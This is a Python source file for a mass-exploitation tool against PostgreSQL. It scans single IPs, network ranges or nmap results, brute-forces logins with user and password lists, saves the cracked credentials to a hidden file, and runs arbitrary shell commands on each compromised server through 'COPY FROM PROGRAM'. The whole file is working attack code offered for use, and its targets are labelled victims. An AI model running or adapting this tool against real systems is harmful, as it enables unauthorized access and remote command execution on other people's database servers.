#!/usr/bin/env python3

import argparse
import psycopg2
import re
import ipaddress

class Victim:
    def __init__(self, ip, port, username=None, password=None):
        self.ip = ip
        self.port = port
        self.username = username
        self.password = password


    def try_login(self, username='', password=''):
        return make_query(self.ip, self.port, username, password)


    def port_is_open(self):
        data = self.try_login()
        if data['message'] == 'timeout':
            print(self.ip, '- Timeout')
            return False
        else:
            return True


    # Bruteforce login/password lists
    # Sets self.username, self.password if valid
    # Returns True or False
    def bruteforce(self, userlist, passlist):
        for username in userlist:
            for password in passlist:
                data = self.try_login(username, password)
                if data['status'] == 'ok':
                    print("[+] Good credentials:", username + ":" + password)
                    self.username = username
                    self.password = password
                    self.add_version(data['message'])
                    return True
        return False


    def add_version(self, version):
        self.version = version
        self.major_version = int(re.findall(r'PostgreSQL (.*?)\.', version, re.IGNORECASE)[0])
        self.is_linux = any(x in version for x in ['linux', 'x86_64', 'Debian', 'Ubuntu'])


    def do_rce(self, command):
        if not command:
            if self.is_linux:
                command = 'uname -a && id && ifconfig'
            else:
                command = 'ipconfig && whoami /priv'

        if self.major_version >= 9:
            rce = self.do_rce_v9_v10(command)
        elif self.major_version == 8:
            rce = self.do_rce_v8(command)
        else:
            print("[-] PSQL version is too old")

        print("[!] RCE '" + command + "'")
        print(rce + "\n" + "-" * 50)


    def do_rce_v9_v10(self, command):
        make_query(self.ip, self.port, self.username, self.password, "CREATE TABLE IF NOT EXISTS debugger (id text);")
        make_query(self.ip, self.port, self.username, self.password, "COPY debugger from program '" + command + "';")
        command_result = make_query(self.ip, self.port, self.username, self.password, "SELECT id FROM debugger;")
        make_query(self.ip, self.port, self.username, self.password, "DROP TABLE debugger;")
        return command_result['message']


    def do_rce_v8(self, command):
        return 'RCE v8 is not implemented yet'


    def save_victim(self):
        # We cannot use r+ because file may not exist before first run. We cannot use w+ because it deletes the file.
        # So we use a+. But this mode sets initial position at the end, so...
        f = open('.psql-mass-rce.saved', 'a+')
        last_position = f.tell() # remember last position
        f.seek(0) # goto first position of the file to search if victim is already in the file
        host_port = self.ip + ":" + str(self.port)
        if host_port not in f.read():
            f.seek(last_position) # goto last position of the file to write new string
            f.write(host_port + ":" + self.username + ":" + self.password + "\n")
        f.close()


# Make PSQL query with psycopg2
# Returns {'status': '', 'message': ''}
def make_query(host, port, user, password, query='SELECT version();'):
    _result = None
    try:
        try:
            conn = psycopg2.connect(host=host, port=port, user=user, password=password, connect_timeout=2, dbname='')
        except psycopg2.OperationalError as e:
            if "timeout expired" in str(e):
                return {'status': 'fail', 'message': 'timeout'}
            return {'status': 'fail', 'message': str(e)}

        cur = conn.cursor()
        cur.execute(query)

        if "select" in query.lower():
            list_results = []
            for row in cur.fetchall():
                list_results.append(row[0])
            _result = "\n".join(list_results)
        else:
            conn.commit()

        cur.close()
        conn.close()

        return { 'status': 'ok', 'message': _result }
    except psycopg2.Error as e:
        cur.close()
        conn.close()
        # print("[-] Could not '" + query + "' :", e)
        return { 'status': 'fail', 'message': str(e) }


# Parse gnmap file
# Returns (ip, port)
def parse_file_gnmap(file_path):
    try:
        with open(file_path, 'r') as w:
            data = w.read()

        parsed = re.findall(r'Host: ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}) .* ([0-9]{1,5})/', data)

        return parsed
    except FileNotFoundError:
        return ()


# Parse string from CLI arguments: ip/range/file.
# Returns [(ip, port)]
def parse_target(target, port):
    try:
        ipaddress.ip_address(target)
        return [(target, port)]  # one IP
    except ValueError:
        try:
            ipaddress.ip_network(target)
            return map(lambda arg: (arg, port), ipaddress.ip_network(target).hosts())  # range /24. create [(host,port)]
        except ValueError:
            try:
                return parse_file_gnmap(target)  # local gnmap file
            except:
                print("Target is not IP or a Network. Try to re-set latest(s) bit, e.g. 8.8.0.0/16")
                exit()


def attack_victim(ip, port, userlist, passlist, command):
    print("[x] Starting host " + ip + ":" + str(port))
    victim = Victim(ip, port)
    if victim.port_is_open():
        if victim.bruteforce(userlist, passlist):
            victim.save_victim()
            victim.do_rce(command)


def load_save_file():
    try:
        with open('.psql-mass-rce.saved') as f:
            lines = f.read().splitlines()
        return lines
    except:
        return []


# Parse CLI arguments
def parse_args():
    parser = argparse.ArgumentParser(description='Scan network for postgreses, bruteforce passwords, pwn.')
    parser.add_argument('targets', metavar='targets', type=str, nargs='*') # nargs='+' if targets is necessary
    parser.add_argument('--userfile', dest='userfile',
                        default=None, help='File with a list of users')
    parser.add_argument('--passfile', dest='passfile',
                        default=None, help='File with a list of passwords')
    parser.add_argument('--command', dest='command',
                        default=None, help='Command to execute on a target machine')
    parser.add_argument('--port', dest='port',
                        default=None, help='Port to connect')
    parser.add_argument('--saved', dest='saved', action='store_true',
                        default=False, help='Load data from saved session file')

    args = parser.parse_args()

    userfile_lines = []
    passfile_lines = []

    try:
        for line in list(open(args.userfile)):
            userfile_lines.append(line.strip())
    except:
        userfile_lines = ['postgres']
    try:
        for line in list(open(args.passfile)):
            passfile_lines.append(line.strip())
    except:
        passfile_lines = ['postgres', 'postgres1']

    args.userfile = userfile_lines
    args.passfile = passfile_lines
    args.command = args.command if args.command else ''
    args.port = args.port if args.port else 5432

    return args


def main():
    args = parse_args()
    command = args.command

    if args.saved:
        for line in load_save_file():
            data = line.split(':')
            attack_victim(data[0], data[1], [data[2]], [data[3]], command)
    else:
        for target in args.targets:
            for ip, port in parse_target(target, args.port):
                attack_victim(ip, port, args.userfile, args.passfile, command)

if __name__ == '__main__':
    main()
